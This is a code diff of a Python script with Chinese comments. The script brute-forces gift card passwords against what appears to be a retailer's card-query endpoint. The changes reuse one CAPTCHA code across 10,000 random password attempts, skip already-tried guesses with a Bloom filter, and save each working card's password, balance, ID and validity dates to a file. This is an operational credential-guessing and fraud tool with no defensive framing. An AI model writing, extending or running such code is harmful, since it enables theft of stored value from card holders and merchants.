@@ -46,7 +46,7 @@ def init():
     global UUID
     #初始化UUID
     UUID=getNewUUID()
-    print('UUID is : %s' % UUID)
+#     print('UUID is : %s' % UUID)
     global verifyCodeUrl
     verifyCodeUrl = verifyCodeUrl % UUID
     global bf
@@ -55,15 +55,15 @@ def init():
 def getNewUUID():
     try:
         source_code = loginUtil.Navigate(uuidUrl)
-        print('get new uuid:')
-        print(source_code)
+#         print('get new uuid:')
+#         print(source_code)
         soup = BeautifulSoup(source_code,"html.parser")
 #         uuid = soup.find('img', {'id':'verifyImg'})
         uuid = soup.find_all('img',{'id':'verifyImg'})[0]['src'].split("?uid=")[1].split("&")[0]
         if uuid == None:
             print("鬼知道什么原因，居然没有uuid!")
         else:
-            print("获取到的uuid为：%s" % uuid)
+#             print("获取到的uuid为：%s" % uuid)
             return uuid
     except Exception as e:
         print("Error",e)
@@ -72,10 +72,10 @@ def getNewUUID():
 #保存验证码图片&&获取文本的验证码
 def getNewVerifyCode(verifyCodeUrl):
     #下载验证码图片
-    print('开始获取验证码：%s' % verifyCodeUrl)
+#     print('开始获取验证码：%s' % verifyCodeUrl)
     try:
         codeLocalPath = fileUtil.downCode(verifyCodeUrl)
-        print('验证码识别中.......')
+#         print('验证码识别中.......')
         image=Image.open(codeLocalPath)
         image.show()
         vcode = input("请输入弹出图片中的验证码：") 
@@ -130,7 +130,7 @@ def getMsgByCode(code):
 #检查密码是否有效
 def checkIfPassValid(url,uuid,pwd,verifyCode):
     url = url+str(random.random())
-    print('check pass url: %s' % url)
+#     print('check pass url: %s' % url)
     postData = {
       'actionType':'query',
       'uuid':uuid,
@@ -138,23 +138,26 @@ def checkIfPassValid(url,uuid,pwd,verifyCode):
       'giftCardPwd':pwd,
       'verifyCode':verifyCode
     }
-    print('check pass post data: %s' % postData)
+#     print('check pass post data: %s' % postData)
     checkRes = loginUtil.Navigate(url,postData)
-    print('check pwd:%s' % pwd)
+#     print('check pwd:%s' % pwd)
     print('check response: %s' % checkRes)
     code = jsonUtil.getAttr(checkRes,'code')
     if code == 'success':
-        print('成功找到一个可用的E卡密码:%s' % pwd)
+        print('----------------------------------成功找到一个可用的E卡密码:%s---------------------------------' % pwd)
         #将有效的卡密写到文件
-        
+        cardObj = jsonUtil.getAttr(checkRes,'data')[0]
+        #密码，面值，余额，giftCardType，cardBrand，giftCardId，激活时间，有效期开始，有效期结束
+        cardStr = pwd+','+cardObj['amountTotal']+','+cardObj['amount']+','+cardObj['giftCardType']+','+cardObj['cardBrand']+','+cardObj['giftCardId']+','+cardObj['timeActived']+','+cardObj['timeBegin']+','+cardObj['timeEnd']+'\n'
+        fileUtil.appendTextFile(cardPath+'list.txt', cardStr)
     else:
         print('此密码验证未通过:[%s]' % getMsgByCode(code))
     
 if __name__=='__main__':
     init()
     #循环检查随机密码 每次的randPwd和verifyCode不一样 其他的参数不变
-    for i in range(1):
-        verifyCode = getNewVerifyCode(verifyCodeUrl)
+    verifyCode = getNewVerifyCode(verifyCodeUrl)
+    for i in range(10000):
         randPwd = getNewRandPwd()
         #如果已经存在就重新生成随机密码
         while(bf.is_element_exist(randPwd)):
